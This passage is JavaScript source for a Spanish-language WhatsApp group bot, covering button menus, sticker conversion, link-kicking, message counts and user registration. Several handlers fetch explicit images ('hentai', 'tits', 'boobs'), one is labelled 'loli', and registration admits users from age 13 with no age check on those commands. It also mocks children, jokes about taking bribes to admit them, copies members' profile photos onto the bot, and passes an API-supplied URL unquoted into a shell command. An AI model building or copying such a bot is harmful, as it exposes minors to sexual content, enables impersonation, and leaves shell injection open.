  buttons1 = [{buttonId:`grupo`,buttonText:{displayText: 'Grupo de WhatsApp'},type:1},]
  imageMsg = (await leo.prepareMessageMedia(fs.readFileSync(`./media/imagen/TikTok.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/imagen/fake.jpg`)})).imageMessage
  buttonsMessage = {
  contentText: `${txtt}`,
  footerText: '© Creator 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊', imageMessage: imageMsg,
  buttons: buttons1,
  headerType: 4}
  prep = leo.prepareMessageFromContent(from, { buttonsMessage }, { quoted: choute })
  leo.relayWAMessage(prep)
  addFilter(from)
  addLevelingLevel(sender, 5)	}}

//BOTONES

if (choute.message.buttonsResponseMessage){
  test = choute.message.buttonsResponseMessage.selectedButtonId
  if (test.includes(`pos`)){
    leo.sendMessage(from, fs.readFileSync('./media/imagen/admin.jpg'), image, {caption: `${allmenu}`, quoted: choute, contextInfo: { mentionedJid: [sender,ownerNumber]}})
    addFilter(from)
      addLevelingLevel(sender, 5)	}}


  if (choute.message.listResponseMessage){
    test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
    if (test.includes(`soluboton`)){
    leo.updatePresence(from, Presence.composing)
    if (!isRegister) return leoply(baby.only.usrReg)
    uptime = process.uptime()
leo.sendMessage(from, `*SOLUCCION NO TE APARECEN LOS BOTONES EN LOS BOT DE WHATSAPP* \nhttps://youtu.be/s5c6FTjmdPA `, MessageType.text, {quoted: choute, contextInfo: {"forwardingScore": 508, "isForwarded": true, "externalAdReply": 
  {"title": `Hola ${pushname} 👋🏻`, 
  "body": `𝕿𝖍𝖊 𝕮𝖍𝖔𝖚𝖙𝖊`, "mediaType": 2, 
  "thumbnail": fs.readFileSync(`media/imagen/multimedia.jpg`), 
  mediaUrl: "https://youtu.be/s5c6FTjmdPA"}}})
    addFilter(from)
    addLevelingLevel(sender, 5)	}}  

if (choute.message.listResponseMessage){
  test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
  if (test.includes(`install`)){
  leo.updatePresence(from, Presence.composing)
  if (!isRegister) return leoply(baby.only.usrReg)
  uptime = process.uptime()
  leo.sendMessage(from, `${install}`, MessageType.text, {quoted: choute, contextInfo: { mentionedJid: [sender,ownerNumber]}})  
  addFilter(from)
  addLevelingLevel(sender, 5)	}}  

if (choute.message.buttonsResponseMessage){
test = choute.message.buttonsResponseMessage.selectedButtonId
if (test.includes(`verdad`)){
  if (isBan) return leoply  (baby.only.benned)	
  if (!isRegister) return leoply(baby.only.usrReg)
  respuesta = [`${A}`,`${B}`,`${C}`, `${D}`,`${E}`,`${F}`,`${G}`,`${H}`,`${I}`,`${J}`,`${K}`,`${L}`,`${M}`,`${N}`,`${Ñ}`,`${O}`,`${P}`,`${Q}`,`${R}`,`${S}`,`${T}`,`${U}`,`${V}`,`${W}`,`${X}`,`${Y}`,`${Z}`]
  answer = respuesta[Math.floor(Math.random() * respuesta.length)]
  reply(answer)  
  addFilter(from)
    addLevelingLevel(sender, 5)	}}

if (choute.message.buttonsResponseMessage){
test = choute.message.buttonsResponseMessage.selectedButtonId
if (test.includes(`reto`)){
  if (isBan) return leoply  (baby.only.benned)	
  if (!isRegister) return leoply(baby.only.usrReg)
  respuesta = [ `${R1}`, `${R2}`, `${R3}`, `${R4}`, `${R5}`, `${R6}`, `${R7}`, `${R8}`, `${R9}`, `${R10}`, `${R11}`, `${R12}`, `${R13}`, `${R14}`, `${R15}`, `${R16}`, `${R17}`, `${R18}`, `${R19}`, `${R20}`, `${R21}`, `${R22}`, `${R23}`, `${R24}`, `${R25}`]
  answer = respuesta[Math.floor(Math.random() * respuesta.length)]
  reply(answer)
  addFilter(from)  
    addLevelingLevel(sender, 5)	}}


    if (choute.message.buttonsResponseMessage){
      test = choute.message.buttonsResponseMessage.selectedButtonId
      if (test.includes(`mamaguevo`)){
        if (isBan) return leoply  (baby.only.benned)	
        if (!isRegister) return leoply(baby.only.usrReg)
    const cospla =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
    const cosplay1 = cospla[Math.floor(Math.random() * cospla.length)]
imag = fs.readFileSync(`./media/imagen/cosplay/${cosplay1}.jpg`);              
txtt =`𝕭𝖆𝖇𝖞 𝕭𝖊𝖈𝖍𝖔𝖘𝖔 𝕺𝖋𝖈`
buttons1 = [{buttonId:`mamaguevo`,buttonText:{displayText: 'Siguiente 😋'},type:1},]
imageMsg = (await leo.prepareMessageMedia((imag), 'imageMessage', {thumbnail: fs.readFileSync(`./media/imagen/fake.jpg`)})).imageMessage
buttonsMessage = {
contentText: `${txtt}`,
footerText: '© Creator 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊', imageMessage: imageMsg,
buttons: buttons1,
headerType: 4}
prep = leo.prepareMessageFromContent(from, { buttonsMessage }, { quoted: choute,  contextInfo: { mentionedJid: [sender,ownerNumber]} })
leo.relayWAMessage(prep)
addFilter(from)  
addLevelingLevel(sender, 5)	}}


    //LISTA
    if (choute.message.buttonsResponseMessage){
      test = choute.message.buttonsResponseMessage.selectedButtonId
      if (test.includes(`youtube`)){
reply (`${agra}`)
        addFilter(from)  
          addLevelingLevel(sender, 5)	}}
//
if (choute.message.buttonsResponseMessage){
  test = choute.message.buttonsResponseMessage.selectedButtonId
  if (test.includes(`listadmin`)){
    if (isBan) return leoply  (baby.only.benned)	
    if (!isRegister) return leoply(baby.only.usrReg)
    if (!isGroup) return leoply(baby.only.group)
    adm = `*Este grupo* *${groupMetadata.subject}*\nTiene ${groupAdmins.length} Administradores.\n\n`
    no = 0
    for (let admon of groupAdmins) {
    no += 1
    adm += `[${no.toString()}] @${admon.split('@')[0]}\n`
    }
    mentions(adm, groupAdmins, true)
    addFilter(from)  
      addLevelingLevel(sender, 5)	}}


  if (choute.message.listResponseMessage){
    test = choute.message.listResponseMessage.singleSelectReply.selectedRowId
    if (test.includes(`Base`)){
    leo.updatePresence(from, Presence.composing)
    if (!isRegister) return leoply(baby.only.usrReg)
    uptime = process.uptime()
    leo.sendMessage(from, `🔥 SIGUEME EN YOUTUBE🔥 \n${base}`, MessageType.text, {quoted: choute, caption: `${base}`, contextInfo: {"forwardingScore": 508, "isForwarded": true, "externalAdReply": 
    {"title": `Hola ${pushname} 👋🏻`, 
    "body": `BabyBechoso`, "mediaType": 2, 
    "thumbnail": fs.readFileSync(`media/imagen/fake.jpg`), 
    mediaUrl: "https://youtu.be/cxZ98u3Jqto"}}},
    {contextInfo: { mentionedJid: [sender,ownerNumber]}})  
    addFilter(from)
    addLevelingLevel(sender, 5)	}}


    if (choute.message.buttonsResponseMessage){
      test = choute.message.buttonsResponseMessage.selectedButtonId
      if (test.includes(`hetai`)){
        if (isBan) return leoply  (baby.only.benned)	
        if (!isRegister) return leoply(baby.only.usrReg)
        hentaiz = await axios.get('https://nekos.life/api/v2/img/hentai')
        bufhtz = await getBuffer(hentaiz.data.url)
          txtt =`𝕭𝖆𝖇𝖞 𝕭𝖊𝖈𝖍𝖔𝖘𝖔 𝕺𝖋𝖈`
          buttons1 = [{buttonId:`hetai`,buttonText:{displayText: 'Siguiente 😋'},type:1}]
          imageMsg = (await leo.prepareMessageMedia((bufhtz), 'imageMessage', {thumbnail: fs.readFileSync(`./media/imagen/fake.jpg`)})).imageMessage
          buttonsMessage = {
          contentText: `${txtt}`,
          footerText: '𝕭𝖆𝖇𝖞 𝕭𝖊𝖈𝖍𝖔𝖘𝖔 𝕺𝖋𝖈\n© Creator 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊', imageMessage: imageMsg,
          buttons: buttons1,
          headerType: 4}
          prep = leo.prepareMessageFromContent(from, { buttonsMessage }, { quoted: choute,  contextInfo: { mentionedJid: [sender,ownerNumber]} })
          leo.relayWAMessage(prep)
          .catch(err => {
          return('Intentalo nuevamente..')})
          addFilter(from)  
          addLevelingLevel(sender, 5)	}}

if (choute.message.buttonsResponseMessage){
test = choute.message.buttonsResponseMessage.selectedButtonId
if (test.includes(`loli`)){
if (isBan) return leoply  (baby.only.benned)	
if (!isRegister) return leoply(baby.only.usrReg)
  anu = await axios.get('https://nekos.life/api/v2/img/neko')
  loli = await getBuffer(anu.data.url)
 /// leo.sendMessage(from, loliz, image, {quoted: choute})
  imag = loli            
  txtt =`𝕭𝖆𝖇𝖞 𝕭𝖊𝖈𝖍𝖔𝖘𝖔 𝕺𝖋𝖈`
  buttons1 = [{buttonId:`loli`,buttonText:{displayText: 'Siguiente 😋'},type:1}]
  imageMsg = (await leo.prepareMessageMedia((imag), 'imageMessage', {thumbnail: fs.readFileSync(`./media/imagen/fake.jpg`)})).imageMessage
  buttonsMessage = {
  contentText: `${txtt}`,
  footerText: '*Aviso:* No pulses por pulsar\n© Creator 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊', imageMessage: imageMsg,
  buttons: buttons1,
  headerType: 4}
  prep = leo.prepareMessageFromContent(from, { buttonsMessage }, { quoted: choute,  contextInfo: { mentionedJid: [sender,ownerNumber]} })
  leo.relayWAMessage(prep)
          addFilter(from)  
          addLevelingLevel(sender, 5)	}}

if (body.includes("http://")){
  if (!botAdmin) return 
  if (itsMe) return

if (!isGroup) return
if (!isAntiLink) return
if (isAdmin) return('🧐')
leo.updatePresence(from, Presence.composing)
var kic = `@${sender.split("@")[0]}@s.whatsapp.net`
reply(`Los link no son permitidos rata ${sender.split("@")[0]}`, mentionedJid [sender])
setTimeout( () => {
leo.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
}, 1000)
setTimeout( () => {
leo.updatePresence(from, Presence.composing)
reply("adios")
}, 0)
}
if (body.includes(".com")){
if (!isGroup) return
if (!isAntiLink) return
if (isAdmin) return('🧐')
if (itsMe) return
if (!botAdmin & isAntiLink & isGroup) 

leo.updatePresence(from, Presence.composing)
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(`Los links no son permitidos rata @${sender.split("@")[0]}`)
setTimeout( () => {
leo.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
}, 1000)
setTimeout( () => {
leo.updatePresence(from, Presence.composing)
reply("adios")
}, 0)
}

if (!isOwner) if (isAntiPv) if (!isGroup) {
  reply (`El bot solo puede ser usado en grupos, por lo que te bloqueale`)
  setTimeout( () => {
   leo.blockUser(sender, 'add')
   }, 5000)
  }

  const countMessage = JSON.parse(fs.readFileSync('./src/countmsg.json'))
  const groupIdscount = []
  const numbersIds = []
  for(let obj of countMessage) {
  groupIdscount.push(obj.groupId)
  }
  if(isGroup && groupIdscount.indexOf(from) >= 0) {
  var ind = groupIdscount.indexOf(from)
  for(let obj of countMessage[ind].numbers) {numbersIds.push(obj.jid)}
  if(numbersIds.indexOf(sender) >=0) {
  var indnum = numbersIds.indexOf(sender)
  countMessage[ind].numbers[indnum].messages += 1
  countMessage[ind].numbers[indnum].cmd_messages += isCmd ? 1 : 0
  fs.writeFileSync('./src/countmsg.json', JSON.stringify(countMessage, null, 2)+ '\n')
  } else {
  const messages = 1
  const cmd_messages = isCmd ? 1 : 0
  countMessage[ind].numbers.push({
  jid: sender,
  messages: messages,
  cmd_messages: cmd_messages
  })
  fs.writeFileSync('./src/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
  }
  }
  else if(isGroup) {
  countMessage.push({
  groupId: from,
  numbers: [{
  jid: sender,
  messages: 2,
  cmd_messages: isCmd ? 1 : 0
  }]
  })
  fs.writeFileSync('./src/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
  }	

if (body.includes(`@${botNumber}`)){
  leo.sendMessage(from, fs.readFileSync('./sticker/moni.webp'), sticker, {quoted: choute})
  }

  async function extraPlay(cArgs) {
    try {
    if (args.length < 1) return reply('O que você deseja procurar?')
    teks = cArgs
    if (!teks.endsWith("-doc")){
    res = await yts(`${teks}`).catch(e => {
    reply('_[ ! ] O erro de consulta inserido não existe_')
    })
    let thumbInfo = `「  *Youtube Play*  」
    
    🎶 *Título*: ${res.all[0].title}
    
    ✅ *ID:* ${res.all[0].videoId}
    
    📅 *Carregado em:* ${res.all[0].ago}
    
    📢 *Visualizações:* ${res.all[0].views}
    
    🕓 *Duração:* ${res.all[0].timestamp}
    
    📀 *Canal:* ${res.all[0].author.name}
    
    ✅ *Link do canal:* ${res.all[0].author.url}
    
    *_Aguarde o processo de upload....._*
    `
    sendFileFromUrl(res.all[0].image, image, {quoted: choute, caption: thumbInfo})
    res = await y2mateA(res.all[0].url).catch(e => {
    reply('_[ ! ] Erro ao entrar no Y2mate Web * Tente repetir*_')
    })
    sendFileFromUrl(res[0].link, audio, {quoted: choute, mimetype: 'audio/mp4', filename: res[0].output})
    }
    if (teks.endsWith("-doc")){
    const tec = teks.split("-doc")
    res = await yts(`${tec}`).catch(e => {
    reply('_[ ! ] O erro de consulta inserido não existe_')
    })
    let thumbInfo = `❒「  *${yo}*  」
    ├ *Título :* ${res.all[0].title}
    ├ *ID de vídeo :* ${res.all[0].videoId}
    ├ *Carregado em :* ${res.all[0].ago}
    ├ *Visualizações :* ${res.all[0].views}
    ├ *Duração :* ${res.all[0].timestamp}
    ├ *Canal :* ${res.all[0].author.name}
    └ *Link do canal :* ${res.all[0].author.url}
    
    *_Aguarde o processo de download ...._*
    `
    sendFileFromUrl(res.all[0].image, image, {quoted: choute, caption: thumbInfo})
    res = await y2mateA(res.all[0].url).catch(e => {
    reply('_[ ! ] Erro ao entrar no Y2mate Web * Tente repetir*_')
    })
    sendFileFromUrl(res[0].link, document, {quoted: choute, mimetype: 'audio/mp3', filename: res[0].output})
    }
    } catch(e) {
    console.log(e);
    reply(`A solicitação faiou :/`)
    }
    }
  //AUTOSTICKER
  function _0x3a1f(){const _0x2810d1=['extendedTextMessage','301007YXHJMJ','798JxPnGe','comenzando\x20:\x20','https://chat.whatsapp.com/3Ig12vkn5o95KkECt9C5Pz','error','FINALIZADO','.webp','error\x20:\x20','contextInfo','709621bSRSEJ','11748fUruIy','unlinkSync','stringify','7911iXSfnF','downloadAndSaveMediaMessage','libwebp','videoMessage','parse','72SBXBXT','log','readFileSync','650HuTsLu','input','quotedM','https://i.ibb.co/gDJ29Jt/Baby-Foto-Perfil.jpg','addOutputOptions','end','save','message','55UvhivN','-vcodec','21130TseGgc','132priVHS','430014dvNnYo','6059131IUPZyE','17zNHqFb','webp','scale=\x27min(320,iw)\x27:min\x27(320,ih)\x27:force_original_aspect_ratio=decrease,fps=15,\x20pad=320:320:-1:-1:color=white@0.0,\x20split\x20[a][b];\x20[a]\x20palettegen=reserve_transparent=on:transparency_color=ffffff\x20[p];\x20[b][p]\x20paletteuse'];_0x3a1f=function(){return _0x2810d1;};return _0x3a1f();}const _0x5b1a16=_0x24ff;(function(_0xe1866f,_0x329f68){const _0xa2001c=_0x24ff,_0x384b53=_0xe1866f();while(!![]){try{const _0x3cc3df=-parseInt(_0xa2001c(0xc0))/0x1*(parseInt(_0xa2001c(0xbc))/0x2)+parseInt(_0xa2001c(0xc5))/0x3*(parseInt(_0xa2001c(0xa7))/0x4)+parseInt(_0xa2001c(0xba))/0x5*(-parseInt(_0xa2001c(0xbe))/0x6)+-parseInt(_0xa2001c(0xc4))/0x7*(-parseInt(_0xa2001c(0xaf))/0x8)+-parseInt(_0xa2001c(0xaa))/0x9*(-parseInt(_0xa2001c(0xb2))/0xa)+-parseInt(_0xa2001c(0xa6))/0xb*(-parseInt(_0xa2001c(0xbd))/0xc)+-parseInt(_0xa2001c(0xbf))/0xd;if(_0x3cc3df===_0x329f68)break;else _0x384b53['push'](_0x384b53['shift']());}catch(_0x2a76c6){_0x384b53['push'](_0x384b53['shift']());}}}(_0x3a1f,0x7a4dc));function _0x24ff(_0x4526cc,_0x481691){const _0x3a1f44=_0x3a1f();return _0x24ff=function(_0x24ff52,_0x469265){_0x24ff52=_0x24ff52-0xa3;let _0x403f30=_0x3a1f44[_0x24ff52];return _0x403f30;},_0x24ff(_0x4526cc,_0x481691);}try{ppimg=await leo['getProfilePicture'](sender['split']('@')[0x0]+'@s.whatsapp.net');}catch{ppimg=_0x5b1a16(0xb5);}const perfil=await getBuffer(ppimg);if(isMedia&&!choute[_0x5b1a16(0xb9)][_0x5b1a16(0xad)]||isImage){if(!isAutoSt)return;const aumedia=isQuotedImage?JSON[_0x5b1a16(0xae)](JSON[_0x5b1a16(0xa9)](choute)['replace'](_0x5b1a16(0xb4),'m'))[_0x5b1a16(0xb9)][_0x5b1a16(0xc3)][_0x5b1a16(0xa5)]:choute,meia=await leo[_0x5b1a16(0xab)](aumedia);ran=getRandom(_0x5b1a16(0xa3)),ffmpeg('./'+meia)[_0x5b1a16(0xb3)](meia)['on']('start',function(_0x2d9a6a){const _0x237626=_0x5b1a16;console[_0x237626(0xb0)](_0x237626(0xc6)+_0x2d9a6a);})['on'](_0x5b1a16(0xc8),function(_0x409964){const _0x5ec12f=_0x5b1a16;console[_0x5ec12f(0xb0)](_0x5ec12f(0xa4)+_0x409964),fs['unlinkSync'](meia);})['on'](_0x5b1a16(0xb7),async function(){const _0x2231dd=_0x5b1a16;console['log'](_0x2231dd(0xc9)),await leo['sendMessage'](from,fs[_0x2231dd(0xb1)](ran),sticker,{'quoted':choute,'contextInfo':{'mentionedJid':[sender],'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':'AutoSticker','body':'AutoSticker','thumbnail':perfil,'sourceUrl':_0x2231dd(0xc7)}}}),fs[_0x2231dd(0xa8)](meia),fs[_0x2231dd(0xa8)](ran);})[_0x5b1a16(0xb6)]([_0x5b1a16(0xbb),_0x5b1a16(0xac),'-vf',_0x5b1a16(0xc2)])['toFormat'](_0x5b1a16(0xc1))[_0x5b1a16(0xb8)](ran);}
  //NO COMPLETADOS | TEST | PRUEBAS
switch (command){
  //𝐍𝐨 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐚𝐝𝐨𝐬



case 'quita':




case 'agif':
                            agif = isQuotedSticker ? JSON.parse(JSON.stringify(choute).replace('quotedM','m')).message.extendedTextMessage.contextInfo : choute
                            reply('*Espera un momento...*')
                            owgig = await leo.downloadAndSaveMediaMessage(agif)
                            var rang = getRandom('.gif')
                            exec(`ffmpeg -i ${owgig} ${rang}`, (err) => {
                            fs.unlinkSync(owgig)
                            if (err) return reply('error')
                            toptg = fs.readFileSync(rang)
                            leo.sendMessage(from, toptg, MessageType.gif, {mimetype: 'video/gif', quoted: faud})
                            })
                            break



      case 'trap':
        trapx = await axios.get('https://nekos.life/api/v2/img/tits')
        traps = await getBuffer(trapx.data.url)
        leo.sendMessage(from, traps, image, { quoted: choute })
        .catch(err => {
        return('Intentalo nuevamente..')
        })
        break
  case 'pat':
        ranp = getRandom('.gif')
        rano = getRandom('.webp')
        anu = await axios.get('https://nekos.life/api/v2/img/pat')
        exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
          fs.unlinkSync(ranp)
          if (err) return reply('error')
          buffer = fs.readFileSync(rano)
          leo.sendMessage(from, buffer, MessageType.sticker, {quoted: choute})
          fs.unlinkSync(rano)
        })
        break
  case 'boobs':
        ranp = getRandom('.gif')
        rano = getRandom('.webp')
        anu = await axios.get('https://nekos.life/api/v2/img/boobs')
        exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
          fs.unlinkSync(ranp)
          if (err) return reply('error')
          buffer = fs.readFileSync(rano)
          leo.sendMessage(from, buffer, MessageType.sticker, {quoted: choute})
          fs.unlinkSync(rano)
        })
        break

  case 'clonar':
if (!isGroup) return leoply(baby.only.group)
if (args.length < 1) return reply('Etiqueta a alguien para utilizar su foto!!!')
if (choute.message.extendedTextMessage === undefined || choute.message.extendedTextMessage === null) return reply('Etiqueta a alguien')
mentioned = choute.message.extendedTextMessage.contextInfo.mentionedJid[0]
let {jid, id1, notify } = groupMembers.find(x => x.jid === mentioned)
try {
pp = await leo.getProfilePicture(id)
buffer = await getBuffer(pp)
leo.updateProfilePicture(botNumber, buffer)
mentions(`La foto de perfil se actualizó correctamente con la foto de perfil de: @${id.split('@')[0]}`, [jid], true)
} catch (e) {
reply(baby.ferr)
}
break

    
//COMANDOS DE STICKER

// #stickers
case 'sticker':
case 's':
case 'stiker':
case 'sticker':
                        if (!isRegister) return leoply(baby.only.usrReg)
                        if (isBan) return leoply (baby.only.benned)	
                        if (isMedia && !choute.message.videoMessage || isQuotedImage) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(choute).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : choute
                        const media = await leo.downloadAndSaveMediaMessage(encmedia)
                        ran = getRandom('.webp')
                        ffmpeg(`./${media}`)
                        .input(media)
                        .on('start', function (cmd) {
                        console.log(`comenzando : ${cmd}`);})
                        .on('error', function (err) {
                        console.log(`error : ${err}`);
                        fs.unlinkSync(media);})
                        .on('end', async function () {
                        console.log('FINALIZADO');                      
                        await leo.sendMessage(from,  fs.readFileSync(ran), sticker, {quoted: choute, contextInfo: { mentionedJid: [sender], "forwardingScore": 508, "isForwarded": true, "externalAdReply": 
                        {"title": 'Grupo Oficial',       
                        "body": 'Subcribete Te Podria Interesar',  
                        "thumbnail": fs.readFileSync('./media/imagen/uwu.jpg'),
                        "sourceUrl": 'https://chat.whatsapp.com/KOmt1i9738c2zA1SnSLwn1'}}});
                        fs.unlinkSync(media);
                        fs.unlinkSync(ran);})
                        .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                        .toFormat('webp')
                        .save(ran)
                        } else { reply(`Envíe una imagen con la etiqueta ${prefix} del título o una etiqueta de imagen que haya sido enviada \nLa duración de la etiqueta de video es de 1 a 9 segundos...`)}
                        break

case "attp":
                        if (!isRegister) return leoply(baby.only.usrReg)
                        if (isBan) return leoply  (baby.only.benned)
                        if (args.length == 0) return reply(`Escribe la palabra con la cual devo hacer el sticker \n*EJEMPLO:*${prefix + command} Sexo`)
                        const stick = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
                        leo.sendMessage(from, stick, sticker, { quoted: choute })
                        break      

case 'attp1':
						            if (args.length < 1) return reply('Y el texto?')
                        var teks = encodeURIComponent(args.join(' '))
                        const attp1 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${teks}`)
                        leo.sendMessage(from, attp1, MessageType.sticker, {quoted: choute, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
						            break

case 'emoji':
			                  if (!q) return reply('Y el emoji?')
			                  qes = args.join(' ')
			                  emoji.get(`${qes}`).then(emoji => {
			                  teks = `${emoji.images[4].url}`
    		                sendStickerFromUrl(from,`${teks}`)	
    		                console.log(teks)})
                        .catch((err) => {
                        reply('Solo un emoji')})
    		                break


case 'tovid':
case 'tovideo':
                        if ((isMedia && !choute.message.videoMessage || isQuotedSticker) && args.length == 0) {
                        ger = isQuotedSticker ? JSON.parse(JSON.stringify(choute).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : choute
                        pluton = await leo.downloadAndSaveMediaMessage(ger)
                        webp2mp4File(pluton).then(res=>{
                        sendMediaURL(from,res.result,'Video?')
                        })
                        } else {
                        reply('Etiqueta un sticker')}
                        fs.unlinkSync(pluton)
                        break


//COMANDOS SOBRE INFORMACION SOBRE EL CREADOR | BOT | USUARIO
case 'owner':
case 'creador':
                if (isBan) return leoply  (baby.only.benned)	
                if (!isRegister) return leoply(baby.only.usrReg)	  
                try {
                ppimg = await leo.getProfilePicture(`${ownerNumber.split('@')[0]}@c.us`)
                } catch {
                ppimg = 'https://i.ibb.co/gDJ29Jt/Baby-Foto-Perfil.jpg'}
                tu = await leo.getStatus(`${ownerNumber.split('@')[0]}@c.us`, MessageType.text)
                its = await getBuffer (ppimg)
                leo.sendMessage(from,  its, image, {thumbnail:fs.readFileSync('./media/imagen/cmayor.jpg'), quoted: choute, caption: 
                `${infocreador}`, contextInfo: { mentionedJid: [ownerNumber,sender], "forwardingScore": 508, "isForwarded": true, "externalAdReply": 
                {"title": 'Sigueme en Youtube',       
                "body": 'The Choute OFC',  
                "thumbnail": fs.readFileSync('./media/imagen/ldeadnote.png'),
                "sourceUrl": 'https://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1'}}})
                break  

case 'bug':
case 'error':
case 'reportar':
const problema = args.join(' ')
if (problema.length > 300) return leo.sendMessage(from, 'El texto contiene mas de 300 caracteres, vuelve a intentarlo y escribe menos', MessageType.text, {quoted: choute})
var user = choute.participant
const teks1 = 
`[NOTIFICACION DE ERROR]
👤 Notificado Por : @${user.split("@s.whatsapp.net")[0]}
📋 Problema : ${problema}`
var options = {
text: teks1,
contextInfo: {mentionedJid: [user]}}
leo.sendMessage('18299897014@s.whatsapp.net', options, text, {quoted: choute})
reply('El problema ha sido enviado a mi creador, de ser algun tipo de broma o solo lo haces por molestar o spam, seras baneado de manera definitiva.')
break

case 'git':
case 'github':
                if (isBan) return leoply  (baby.only.benned)	
                if (!isRegister) return leoply(baby.only.usrReg)	
                leo.sendMessage(from, `*Git Del Bot:*\nhttps://github.com/thechoute/Baby-Ofc\n\n*Github de mi Creador:*\nhttps://github.com/thechoute`, MessageType.text, {quoted: choute, contextInfo: { mentionedJid: [sender], "forwardingScore": 508, "externalAdReply": 
                {"title": 'Github Oficial',       
                "body": 'Sigueme en Github',  
                "thumbnail": fs.readFileSync('./media/imagen/absu.jpg'),
                "sourceUrl": 'https://github.com/thechoute/Baby-Ofc'}}})
                break

case 'info':
case 'estado':
case 'infobot':		  
                if (isBan) return leoply  (baby.only.benned)	
                if (!isRegister) return leoply(baby.only.usrReg)	
                try {
                ppimg = await leo.getProfilePicture(`${botNumber.split('@')[0]}@c.us`)
                } catch {
                ppimg = 'https://i.ibb.co/gDJ29Jt/Baby-Foto-Perfil.jpg'
                }
                its = await getBuffer (ppimg)
                leo.sendMessage(from, its, MessageType.image, {quoted: choute, caption: `${infobot}`, contextInfo: {mentionedJid: [ownerNumber]}})
                break

case 'ping':
case 'velocidad':
                leo.sendMessage(from, `Mi velocidad es ${process.uptime()}`, MessageType.text, {quoted: choute})
                break 

case 'reglas':
                if (isBan) return leoply  (baby.only.benned)	
                if (!isRegister) return leoply(baby.only.usrReg)	
                mreg = leo.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": `${reglas}`, "footerText": "*𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊*", "thumbnail": fs.readFileSync('./media/imagen/imgregla.jpg'), "surface": 'CATALOG' }}, {contextInfo: { mentionedJid: [sender,ownerNumber]}, quoted:choute, })
                leo.relayWAMessage(mreg)
                break

case 'soporte':
case 'support':
case 'gpbot':

                if (isBan) return leoply  (baby.only.benned)	
                baby = `*Grupo soporte del Bot:*\n\n${WGrupo}`
                reply(baby) 
                break

case 'd':
case 'del':
                if (isBan) return leoply  (baby.only.benned)	
                if (!isGroup)return reply(baby.only.group)
                try {
                leo.deleteMessage(from, {
                id: choute.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true})
                } catch {
                reply('Solo puedo borrar mensajes míos')
                }
                break

//USUARIO
case 'reg':   
if (isRegister) return reply('*Tu Ya Estas Registrado, o No Lo Recuerdas?*')
if (!q.includes('|')) return  reply(`${registro}`)
const nombre = q.substring(0, q.indexOf('|') - 0)
const edad = q.substring(q.lastIndexOf('|') + 1)
const serialUser = createSerial(12)
const momento = require('moment-timezone')
const time = momento.tz('America/Santo_Domingo').format('HH:mm:ss')
if(isNaN(edad)) return reply('*La edad es numero no letras*')
if (nombre.length >= 10) return reply(`Mi escriba un nombre con menos de 10 letras, no queremos un puente de letras`)
if (edad > 30) return reply(`Pero-\n*Tienes mas de  30 años, no te puedes registrar, mejor cuida tus nietos :D*`)
if (edad < 13) return reply(`Eres menor de 13 años, mejor vete a limpiarte el culo, que para ti no hay registro.\n*Si me das algo puedo hacer la vista gorda :D*`)
